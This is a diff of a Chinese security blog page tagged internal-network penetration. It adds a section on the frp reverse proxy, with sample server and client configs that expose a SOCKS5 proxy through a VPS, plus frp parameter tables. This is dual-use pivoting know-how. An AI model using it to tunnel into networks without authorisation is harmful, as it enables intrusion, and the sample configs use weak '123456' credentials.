@@ -50,8 +50,14 @@
 <meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blogs/pictures/20210712113105.png">
 <meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blogs/pictures/A18DF3C690E25FA929EC2B15CAC4DDF5.png">
 <meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blogs/pictures/20210714140304.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220126135122036.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220126154627344.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220126135122036.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220126215147938.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220126152701899.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220126152844676.png">
 <meta property="article:published_time" content="2021-07-11T07:47:45.000Z">
-<meta property="article:modified_time" content="2021-07-31T17:01:11.439Z">
+<meta property="article:modified_time" content="2022-01-26T13:59:44.854Z">
 <meta property="article:author" content="HacKerQWQ">
 <meta property="article:tag" content="内网渗透">
 <meta name="twitter:card" content="summary">
@@ -309,7 +315,7 @@ height:50vh;
                 
                 
                     <div class="post-intro-read">
-                        <span>Word count: <span class="post-count word-count">2.3k</span>Reading time: <span class="post-count reading-time">9 min</span></span>
+                        <span>Word count: <span class="post-count word-count">6.4k</span>Reading time: <span class="post-count reading-time">26 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -557,6 +563,1266 @@ height:50vh;
 <h3 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h3><p>本地端口转发适用于跳板机双网卡，内外网皆可通，外网也可直接ping跳板机。</p>
 <p>远程端口转发适用于跳板机可出外网，一般通过网关出口，外网不可直接到达内网。</p>
 <p>其适用场景不仅仅与以上两种情况，偶尔也可以把内网当外网，外网当内网来进行SSH隧道的建立。</p>
+<h2 id="frp"><a href="#frp" class="headerlink" title="frp"></a>frp</h2><p>frp 是一个专注于内网穿透的高性能的反向代理应用，支持 TCP、UDP、HTTP、HTTPS 等多种协议。可以将内网服务以安全、便捷的方式通过具有公网 IP 节点的中转暴露到公网。</p>
+<p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/fatedier/frp">https://github.com/fatedier/frp</a></p>
+<p>tcp代理示例：</p>
+<p>服务器端：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">#绑定的地址，这里绑定本机即可</span><br><span class="line">bind_addr &#x3D; 0.0.0.0</span><br><span class="line">#监听的端口，给客户端连接的</span><br><span class="line">bind_port &#x3D; 7001</span><br><span class="line">#客户端连接的密码</span><br><span class="line">token &#x3D; 123456</span><br><span class="line">#管理面板所对应的地址和端口、账号密码</span><br><span class="line">dashboard_addr &#x3D; 0.0.0.0</span><br><span class="line">dashboard_port &#x3D; 7655</span><br><span class="line">dashboard_user &#x3D; admin</span><br><span class="line">dashboard_pwd &#x3D; 123456</span><br><span class="line">#最大的同时连接数</span><br><span class="line">max_pool_count &#x3D; 8</span><br><span class="line">#心跳超时时间</span><br><span class="line">heartbeat_timeout &#x3D; 90</span><br></pre></td></tr></table></figure>
+
+<p>客户端：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr &#x3D; xxxx</span><br><span class="line">server_port &#x3D; 7001 </span><br><span class="line">token &#x3D; 123456</span><br><span class="line">pool_count &#x3D; 8</span><br><span class="line">protocol &#x3D; tcp </span><br><span class="line">health_check_type &#x3D; tcp </span><br><span class="line">health_check_interval_s &#x3D; 100 </span><br><span class="line">[socks_proxy]</span><br><span class="line">type &#x3D; tcp</span><br><span class="line">remote_port &#x3D; 10001</span><br><span class="line">plugin &#x3D; socks5</span><br><span class="line">use_encryption &#x3D; true </span><br><span class="line">use_compression &#x3D; true</span><br><span class="line">plugin_user &#x3D; admin</span><br><span class="line">plugin_passwd &#x3D; 123456</span><br></pre></td></tr></table></figure>
+
+<p>服务器端启动：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;frps -c frps.ini</span><br></pre></td></tr></table></figure>
+
+<p>客户端启动：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;frpc -c frpc.ini</span><br></pre></td></tr></table></figure>
+
+<p>之后通过vps的10001端口进行代理就可以了</p>
+<h3 id="客户端配置"><a href="#客户端配置" class="headerlink" title="客户端配置"></a>客户端配置</h3><p>frp 客户端的详细配置说明。</p>
+<h4 id="基础配置"><a href="#基础配置" class="headerlink" title="基础配置"></a>基础配置</h4><table>
+<thead>
+<tr>
+<th>参数</th>
+<th>类型</th>
+<th>说明</th>
+<th>默认值</th>
+<th>可选值</th>
+<th>备注</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>server_addr</td>
+<td>string</td>
+<td>连接服务端的地址</td>
+<td>0.0.0.0</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>server_port</td>
+<td>int</td>
+<td>连接服务端的端口</td>
+<td>7000</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>http_proxy</td>
+<td>string</td>
+<td>连接服务端使用的代理地址</td>
+<td></td>
+<td></td>
+<td>格式为 {protocol}://user:<a href="mailto:&#x70;&#x61;&#x73;&#115;&#x77;&#x64;&#x40;&#x31;&#57;&#x32;&#46;&#x31;&#54;&#x38;&#46;&#x31;&#46;&#49;&#x32;&#x38;">&#x70;&#x61;&#x73;&#115;&#x77;&#x64;&#x40;&#x31;&#57;&#x32;&#46;&#x31;&#54;&#x38;&#46;&#x31;&#46;&#49;&#x32;&#x38;</a>:8080 protocol 目前支持 http、socks5、ntlm</td>
+</tr>
+<tr>
+<td>log_file</td>
+<td>string</td>
+<td>日志文件地址</td>
+<td>./frpc.log</td>
+<td></td>
+<td>如果设置为 console，会将日志打印在标准输出中</td>
+</tr>
+<tr>
+<td>log_level</td>
+<td>string</td>
+<td>日志等级</td>
+<td>info</td>
+<td>trace, debug, info, warn, error</td>
+<td></td>
+</tr>
+<tr>
+<td>log_max_days</td>
+<td>int</td>
+<td>日志文件保留天数</td>
+<td>3</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>disable_log_color</td>
+<td>bool</td>
+<td>禁用标准输出中的日志颜色</td>
+<td>false</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>pool_count</td>
+<td>int</td>
+<td>连接池大小</td>
+<td>0</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>user</td>
+<td>string</td>
+<td>用户名</td>
+<td></td>
+<td></td>
+<td>设置此参数后，代理名称会被修改为 {user}.{proxyName}，避免代理名称和其他用户冲突</td>
+</tr>
+<tr>
+<td>dns_server</td>
+<td>string</td>
+<td>使用 DNS 服务器地址</td>
+<td></td>
+<td></td>
+<td>默认使用系统配置的 DNS 服务器，指定此参数可以强制替换为自定义的 DNS 服务器地址</td>
+</tr>
+<tr>
+<td>login_fail_exit</td>
+<td>bool</td>
+<td>第一次登陆失败后是否退出</td>
+<td>true</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>protocol</td>
+<td>string</td>
+<td>连接服务端的通信协议</td>
+<td>tcp</td>
+<td>tcp, kcp, websocket</td>
+<td></td>
+</tr>
+<tr>
+<td>tls_enable</td>
+<td>bool</td>
+<td>启用 TLS 协议加密连接</td>
+<td>false</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>tls_cert_file</td>
+<td>string</td>
+<td>TLS 客户端证书文件路径</td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>tls_key_file</td>
+<td>string</td>
+<td>TLS 客户端密钥文件路径</td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>tls_trusted_ca_file</td>
+<td>string</td>
+<td>TLS CA 证书路径</td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>tls_server_name</td>
+<td>string</td>
+<td>TLS Server 名称</td>
+<td></td>
+<td></td>
+<td>为空则使用 server_addr</td>
+</tr>
+<tr>
+<td>disable_custom_tls_first_byte</td>
+<td>bool</td>
+<td>TLS 不发送 0x17</td>
+<td>false</td>
+<td></td>
+<td>当为 true 时，不能端口复用</td>
+</tr>
+<tr>
+<td>heartbeat_interval</td>
+<td>int</td>
+<td>向服务端发送心跳包的间隔时间</td>
+<td>30</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>heartbeat_timeout</td>
+<td>int</td>
+<td>和服务端心跳的超时时间</td>
+<td>90</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>udp_packet_size</td>
+<td>int</td>
+<td>代理 UDP 服务时支持的最大包长度</td>
+<td>1500</td>
+<td></td>
+<td>服务端和客户端的值需要一致</td>
+</tr>
+<tr>
+<td>start</td>
+<td>string</td>
+<td>指定启用部分代理</td>
+<td></td>
+<td></td>
+<td>当配置了较多代理，但是只希望启用其中部分时可以通过此参数指定，默认为全部启用</td>
+</tr>
+</tbody></table>
+<h4 id="权限验证"><a href="#权限验证" class="headerlink" title="权限验证"></a>权限验证</h4><table>
+<thead>
+<tr>
+<th>参数</th>
+<th>类型</th>
+<th>说明</th>
+<th>默认值</th>
+<th>可选值</th>
+<th>备注</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>authentication_method</td>
+<td>string</td>
+<td>鉴权方式</td>
+<td>token</td>
+<td>token, oidc</td>
+<td>需要和服务端一致</td>
+</tr>
+<tr>
+<td>authenticate_heartbeats</td>
+<td>bool</td>
+<td>开启心跳消息鉴权</td>
+<td>false</td>
+<td></td>
+<td>需要和服务端一致</td>
+</tr>
+<tr>
+<td>authenticate_new_work_conns</td>
+<td>bool</td>
+<td>开启建立工作连接的鉴权</td>
+<td>false</td>
+<td></td>
+<td>需要和服务端一致</td>
+</tr>
+<tr>
+<td>token</td>
+<td>string</td>
+<td>鉴权使用的 token 值</td>
+<td></td>
+<td></td>
+<td>需要和服务端设置一样的值才能鉴权通过</td>
+</tr>
+<tr>
+<td>oidc_client_id</td>
+<td>string</td>
+<td>oidc_client_id</td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>oidc_client_secret</td>
+<td>string</td>
+<td>oidc_client_secret</td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>oidc_audience</td>
+<td>string</td>
+<td>oidc_audience</td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>oidc_token_endpoint_url</td>
+<td>string</td>
+<td>oidc_token_endpoint_url</td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
+<h4 id="UI"><a href="#UI" class="headerlink" title="UI"></a>UI</h4><table>
+<thead>
+<tr>
+<th>参数</th>
+<th>类型</th>
+<th>说明</th>
+<th>默认值</th>
+<th>可选值</th>
+<th>备注</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>admin_addr</td>
+<td>string</td>
+<td>启用 AdminUI 监听的本地地址</td>
+<td>0.0.0.0</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>admin_port</td>
+<td>int</td>
+<td>启用 AdminUI 监听的本地端口</td>
+<td>0</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>admin_user</td>
+<td>string</td>
+<td>HTTP BasicAuth 用户名</td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>admin_pwd</td>
+<td>string</td>
+<td>HTTP BasicAuth 密码</td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>asserts_dir</td>
+<td>string</td>
+<td>静态资源目录</td>
+<td></td>
+<td></td>
+<td>AdminUI 使用的资源默认打包在二进制文件中，通过指定此参数使用自定义的静态资源</td>
+</tr>
+</tbody></table>
+<h3 id="服务器端配置"><a href="#服务器端配置" class="headerlink" title="服务器端配置"></a>服务器端配置</h3><p>frp 服务端详细配置说明。</p>
+<h4 id="基础配置-1"><a href="#基础配置-1" class="headerlink" title="基础配置"></a>基础配置</h4><table>
+<thead>
+<tr>
+<th>参数</th>
+<th>类型</th>
+<th>说明</th>
+<th>默认值</th>
+<th>可选值</th>
+<th>备注</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>bind_addr</td>
+<td>string</td>
+<td>服务端监听地址</td>
+<td>0.0.0.0</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>bind_port</td>
+<td>int</td>
+<td>服务端监听端口</td>
+<td>7000</td>
+<td></td>
+<td>接收 frpc 的连接</td>
+</tr>
+<tr>
+<td>bind_udp_port</td>
+<td>int</td>
+<td>服务端监听 UDP 端口</td>
+<td>0</td>
+<td></td>
+<td>用于辅助创建 P2P 连接</td>
+</tr>
+<tr>
+<td>kcp_bind_port</td>
+<td>int</td>
+<td>服务端监听 KCP 协议端口</td>
+<td>0</td>
+<td></td>
+<td>用于接收采用 KCP 连接的 frpc</td>
+</tr>
+<tr>
+<td>proxy_bind_addr</td>
+<td>string</td>
+<td>代理监听地址</td>
+<td>同 bind_addr</td>
+<td></td>
+<td>可以使代理监听在不同的网卡地址</td>
+</tr>
+<tr>
+<td>log_file</td>
+<td>string</td>
+<td>日志文件地址</td>
+<td>./frps.log</td>
+<td></td>
+<td>如果设置为 console，会将日志打印在标准输出中</td>
+</tr>
+<tr>
+<td>log_level</td>
+<td>string</td>
+<td>日志等级</td>
+<td>info</td>
+<td>trace, debug, info, warn, error</td>
+<td></td>
+</tr>
+<tr>
+<td>log_max_days</td>
+<td>int</td>
+<td>日志文件保留天数</td>
+<td>3</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>disable_log_color</td>
+<td>bool</td>
+<td>禁用标准输出中的日志颜色</td>
+<td>false</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>detailed_errors_to_client</td>
+<td>bool</td>
+<td>服务端返回详细错误信息给客户端</td>
+<td>true</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>heartbeat_timeout</td>
+<td>int</td>
+<td>服务端和客户端心跳连接的超时时间</td>
+<td>90</td>
+<td></td>
+<td>单位：秒</td>
+</tr>
+<tr>
+<td>user_conn_timeout</td>
+<td>int</td>
+<td>用户建立连接后等待客户端响应的超时时间</td>
+<td>10</td>
+<td></td>
+<td>单位：秒</td>
+</tr>
+<tr>
+<td>udp_packet_size</td>
+<td>int</td>
+<td>代理 UDP 服务时支持的最大包长度</td>
+<td>1500</td>
+<td></td>
+<td>服务端和客户端的值需要一致</td>
+</tr>
+<tr>
+<td>tls_cert_file</td>
+<td>string</td>
+<td>TLS 服务端证书文件路径</td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>tls_key_file</td>
+<td>string</td>
+<td>TLS 服务端密钥文件路径</td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>tls_trusted_ca_file</td>
+<td>string</td>
+<td>TLS CA 证书路径</td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
+<h4 id="权限验证-1"><a href="#权限验证-1" class="headerlink" title="权限验证"></a>权限验证</h4><table>
+<thead>
+<tr>
+<th>参数</th>
+<th>类型</th>
+<th>说明</th>
+<th>默认值</th>
+<th>可选值</th>
+<th>备注</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>authentication_method</td>
+<td>string</td>
+<td>鉴权方式</td>
+<td>token</td>
+<td>token, oidc</td>
+<td></td>
+</tr>
+<tr>
+<td>authenticate_heartbeats</td>
+<td>bool</td>
+<td>开启心跳消息鉴权</td>
+<td>false</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>authenticate_new_work_conns</td>
+<td>bool</td>
+<td>开启建立工作连接的鉴权</td>
+<td>false</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>token</td>
+<td>string</td>
+<td>鉴权使用的 token 值</td>
+<td></td>
+<td></td>
+<td>客户端需要设置一样的值才能鉴权通过</td>
+</tr>
+<tr>
+<td>oidc_issuer</td>
+<td>string</td>
+<td>oidc_issuer</td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>oidc_audience</td>
+<td>string</td>
+<td>oidc_audience</td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>oidc_skip_expiry_check</td>
+<td>bool</td>
+<td>oidc_skip_expiry_check</td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>oidc_skip_issuer_check</td>
+<td>bool</td>
+<td>oidc_skip_issuer_check</td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
+<h4 id="管理配置"><a href="#管理配置" class="headerlink" title="管理配置"></a>管理配置</h4><table>
+<thead>
+<tr>
+<th>参数</th>
+<th>类型</th>
+<th>说明</th>
+<th>默认值</th>
+<th>可选值</th>
+<th>备注</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>allow_ports</td>
+<td>string</td>
+<td>允许代理绑定的服务端端口</td>
+<td></td>
+<td></td>
+<td>格式为 1000-2000,2001,3000-4000</td>
+</tr>
+<tr>
+<td>max_pool_count</td>
+<td>int</td>
+<td>最大连接池大小</td>
+<td>5</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>max_ports_per_client</td>
+<td>int</td>
+<td>限制单个客户端最大同时存在的代理数</td>
+<td>0</td>
+<td></td>
+<td>0 表示没有限制</td>
+</tr>
+<tr>
+<td>tls_only</td>
+<td>bool</td>
+<td>只接受启用了 TLS 的客户端连接</td>
+<td>false</td>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
+<h4 id="Dashboard-监控"><a href="#Dashboard-监控" class="headerlink" title="Dashboard, 监控"></a>Dashboard, 监控</h4><table>
+<thead>
+<tr>
+<th>参数</th>
+<th>类型</th>
+<th>说明</th>
+<th>默认值</th>
+<th>可选值</th>
+<th>备注</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>dashboard_addr</td>
+<td>string</td>
+<td>启用 Dashboard 监听的本地地址</td>
+<td>0.0.0.0</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>dashboard_port</td>
+<td>int</td>
+<td>启用 Dashboard 监听的本地端口</td>
+<td>0</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>dashboard_user</td>
+<td>string</td>
+<td>HTTP BasicAuth 用户名</td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>dashboard_pwd</td>
+<td>string</td>
+<td>HTTP BasicAuth 密码</td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>enable_prometheus</td>
+<td>bool</td>
+<td>是否提供 Prometheus 监控接口</td>
+<td>false</td>
+<td></td>
+<td>需要同时启用了 Dashboard 才会生效</td>
+</tr>
+<tr>
+<td>asserts_dir</td>
+<td>string</td>
+<td>静态资源目录</td>
+<td></td>
+<td></td>
+<td>Dashboard 使用的资源默认打包在二进制文件中，通过指定此参数使用自定义的静态资源</td>
+</tr>
+</tbody></table>
+<h4 id="HTTP-amp-HTTPS"><a href="#HTTP-amp-HTTPS" class="headerlink" title="HTTP &amp; HTTPS"></a>HTTP &amp; HTTPS</h4><table>
+<thead>
+<tr>
+<th>参数</th>
+<th>类型</th>
+<th>说明</th>
+<th>默认值</th>
+<th>可选值</th>
+<th>备注</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>vhost_http_port</td>
+<td>int</td>
+<td>为 HTTP 类型代理监听的端口</td>
+<td>0</td>
+<td></td>
+<td>启用后才支持 HTTP 类型的代理，默认不启用</td>
+</tr>
+<tr>
+<td>vhost_https_port</td>
+<td>int</td>
+<td>为 HTTPS 类型代理监听的端口</td>
+<td>0</td>
+<td></td>
+<td>启用后才支持 HTTPS 类型的代理，默认不启用</td>
+</tr>
+<tr>
+<td>vhost_http_timeout</td>
+<td>int</td>
+<td>HTTP 类型代理在服务端的 ResponseHeader 超时时间</td>
+<td>60</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>subdomain_host</td>
+<td>string</td>
+<td>二级域名后缀</td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>custom_404_page</td>
+<td>string</td>
+<td>自定义 404 错误页面地址</td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
+<h4 id="TCPMUX"><a href="#TCPMUX" class="headerlink" title="TCPMUX"></a>TCPMUX</h4><table>
+<thead>
+<tr>
+<th>参数</th>
+<th>类型</th>
+<th>说明</th>
+<th>默认值</th>
+<th>可选值</th>
+<th>备注</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>tcpmux_httpconnect_port</td>
+<td>int</td>
+<td>为 TCPMUX 类型代理监听的端口</td>
+<td>0</td>
+<td></td>
+<td>启用后才支持 TCPMUX 类型的代理，默认不启用</td>
+</tr>
+</tbody></table>
+<h3 id="代理配置"><a href="#代理配置" class="headerlink" title="代理配置"></a>代理配置</h3><p>frp 代理的详细配置说明。</p>
+<h4 id="通用配置"><a href="#通用配置" class="headerlink" title="通用配置"></a>通用配置</h4><p>通用配置是指不同类型的代理共同使用的一些配置参数。</p>
+<h4 id="基础配置-2"><a href="#基础配置-2" class="headerlink" title="基础配置"></a>基础配置</h4><table>
+<thead>
+<tr>
+<th>参数</th>
+<th>类型</th>
+<th>说明</th>
+<th>是否必须</th>
+<th>默认值</th>
+<th>可选值</th>
+<th>备注</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>type</td>
+<td>string</td>
+<td>代理类型</td>
+<td>是</td>
+<td>tcp</td>
+<td>tcp, udp, http, https, stcp, sudp, xtcp, tcpmux</td>
+<td></td>
+</tr>
+<tr>
+<td>use_encryption</td>
+<td>bool</td>
+<td>是否启用加密功能</td>
+<td>否</td>
+<td>false</td>
+<td></td>
+<td>启用后该代理和服务端之间的通信内容都会被加密传输</td>
+</tr>
+<tr>
+<td>use_compression</td>
+<td>bool</td>
+<td>是否启用压缩功能</td>
+<td>否</td>
+<td>false</td>
+<td></td>
+<td>启用后该代理和服务端之间的通信内容都会被压缩传输</td>
+</tr>
+<tr>
+<td>proxy_protocol_version</td>
+<td>string</td>
+<td>启用 proxy protocol 协议的版本</td>
+<td>否</td>
+<td></td>
+<td>v1, v2</td>
+<td>如果启用，则 frpc 和本地服务建立连接后会发送 proxy protocol 的协议，包含了原请求的 IP 地址和端口等内容</td>
+</tr>
+<tr>
+<td>bandwidth_limit</td>
+<td>string</td>
+<td>设置单个 proxy 的带宽限流</td>
+<td>否</td>
+<td></td>
+<td></td>
+<td>单位为 MB 或 KB，0 表示不限制，如果启用，会作用于对应的 frpc</td>
+</tr>
+</tbody></table>
+<h4 id="本地服务配置"><a href="#本地服务配置" class="headerlink" title="本地服务配置"></a>本地服务配置</h4><p><code>local_ip</code> 和 <code>plugin</code> 的配置必须配置一个，且只能生效一个，如果配置了 <code>plugin</code>，则 <code>local_ip</code> 配置无效。</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>类型</th>
+<th>说明</th>
+<th>是否必须</th>
+<th>默认值</th>
+<th>可选值</th>
+<th>备注</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>local_ip</td>
+<td>string</td>
+<td>本地服务 IP</td>
+<td>是</td>
+<td>127.0.0.1</td>
+<td></td>
+<td>需要被代理的本地服务的 IP 地址，可以为所在 frpc 能访问到的任意 IP 地址</td>
+</tr>
+<tr>
+<td>local_port</td>
+<td>int</td>
+<td>本地服务端口</td>
+<td>是</td>
+<td></td>
+<td></td>
+<td>配合 local_ip</td>
+</tr>
+<tr>
+<td>plugin</td>
+<td>string</td>
+<td>客户端插件名称</td>
+<td>否</td>
+<td></td>
+<td>见客户端插件的功能说明</td>
+<td>用于扩展 frpc 的能力，能够提供一些简单的本地服务，如果配置了 plugin，则 local_ip 和 local_port 无效，两者只能配置一个</td>
+</tr>
+<tr>
+<td>plugin_params</td>
+<td>map</td>
+<td>客户端插件参数</td>
+<td>否</td>
+<td></td>
+<td></td>
+<td>map 结构，key 需要都以 “plugin_” 开头，每一个 plugin 需要的参数也不一样，具体见客户端插件参数中的内容</td>
+</tr>
+</tbody></table>
+<h4 id="负载均衡和健康检查"><a href="#负载均衡和健康检查" class="headerlink" title="负载均衡和健康检查"></a>负载均衡和健康检查</h4><table>
+<thead>
+<tr>
+<th>参数</th>
+<th>类型</th>
+<th>说明</th>
+<th>是否必须</th>
+<th>默认值</th>
+<th>可选值</th>
+<th>备注</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>group</td>
+<td>string</td>
+<td>负载均衡分组名称</td>
+<td>否</td>
+<td></td>
+<td></td>
+<td>用户请求会以轮询的方式发送给同一个 group 中的代理</td>
+</tr>
+<tr>
+<td>group_key</td>
+<td>string</td>
+<td>负载均衡分组密钥</td>
+<td>否</td>
+<td></td>
+<td></td>
+<td>用于对负载均衡分组进行鉴权，group_key 相同的代理才会被加入到同一个分组中</td>
+</tr>
+<tr>
+<td>health_check_type</td>
+<td>string</td>
+<td>健康检查类型</td>
+<td>否</td>
+<td></td>
+<td>tcp,http</td>
+<td>配置后启用健康检查功能，tcp 是连接成功则认为服务健康，http 要求接口返回 2xx 的状态码则认为服务健康</td>
+</tr>
+<tr>
+<td>health_check_timeout_s</td>
+<td>int</td>
+<td>健康检查超时时间(秒)</td>
+<td>否</td>
+<td>3</td>
+<td></td>
+<td>执行检查任务的超时时间</td>
+</tr>
+<tr>
+<td>health_check_max_failed</td>
+<td>int</td>
+<td>健康检查连续错误次数</td>
+<td>否</td>
+<td>1</td>
+<td></td>
+<td>连续检查错误多少次认为服务不健康</td>
+</tr>
+<tr>
+<td>health_check_interval_s</td>
+<td>int</td>
+<td>健康检查周期(秒)</td>
+<td>否</td>
+<td>10</td>
+<td></td>
+<td>每隔多长时间进行一次健康检查</td>
+</tr>
+<tr>
+<td>health_check_url</td>
+<td>string</td>
+<td>健康检查的 HTTP 接口</td>
+<td>否</td>
+<td></td>
+<td></td>
+<td>如果 health_check_type 类型是 http，则需要配置此参数，指定发送 http 请求的 url，例如 “/health”</td>
+</tr>
+</tbody></table>
+<h4 id="TCP"><a href="#TCP" class="headerlink" title="TCP"></a>TCP</h4><table>
+<thead>
+<tr>
+<th>参数</th>
+<th>类型</th>
+<th>说明</th>
+<th>是否必须</th>
+<th>默认值</th>
+<th>可选值</th>
+<th>备注</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>remote_port</td>
+<td>int</td>
+<td>服务端绑定的端口</td>
+<td>是</td>
+<td></td>
+<td></td>
+<td>用户访问此端口的请求会被转发到 local_ip:local_port</td>
+</tr>
+</tbody></table>
+<h4 id="UDP"><a href="#UDP" class="headerlink" title="UDP"></a>UDP</h4><table>
+<thead>
+<tr>
+<th>参数</th>
+<th>类型</th>
+<th>说明</th>
+<th>是否必须</th>
+<th>默认值</th>
+<th>可选值</th>
+<th>备注</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>remote_port</td>
+<td>int</td>
+<td>服务端绑定的端口</td>
+<td>是</td>
+<td></td>
+<td></td>
+<td>用户访问此端口的请求会被转发到 local_ip:local_port</td>
+</tr>
+</tbody></table>
+<h4 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h4><p><code>custom_domains</code> 和 <code>subdomain</code> 必须要配置其中一个，两者可以同时生效。</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>类型</th>
+<th>说明</th>
+<th>是否必须</th>
+<th>默认值</th>
+<th>可选值</th>
+<th>备注</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>custom_domains</td>
+<td>[]string</td>
+<td>服务器绑定自定义域名</td>
+<td>是(和 subdomain 两者必须配置一个)</td>
+<td></td>
+<td></td>
+<td>用户通过 vhost_http_port 访问的 HTTP 请求如果 Host 在 custom_domains 配置的域名中，则会被路由到此代理配置的本地服务</td>
+</tr>
+<tr>
+<td>subdomain</td>
+<td>string</td>
+<td>自定义子域名</td>
+<td>是(和 custom_domains 两者必须配置一个)</td>
+<td></td>
+<td></td>
+<td>和 custom_domains 作用相同，但是只需要指定子域名前缀，会结合服务端的 subdomain_host 生成最终绑定的域名</td>
+</tr>
+<tr>
+<td>locations</td>
+<td>[]string</td>
+<td>URL 路由配置</td>
+<td>否</td>
+<td></td>
+<td></td>
+<td>采用最大前缀匹配的规则，用户请求匹配响应的 location 配置，则会被路由到此代理</td>
+</tr>
+<tr>
+<td>http_user</td>
+<td>string</td>
+<td>用户名</td>
+<td>否</td>
+<td></td>
+<td></td>
+<td>如果配置此参数，暴露出去的 HTTP 服务需要采用 Basic Auth 的鉴权才能访问</td>
+</tr>
+<tr>
+<td>http_pwd</td>
+<td>string</td>
+<td>密码</td>
+<td>否</td>
+<td></td>
+<td></td>
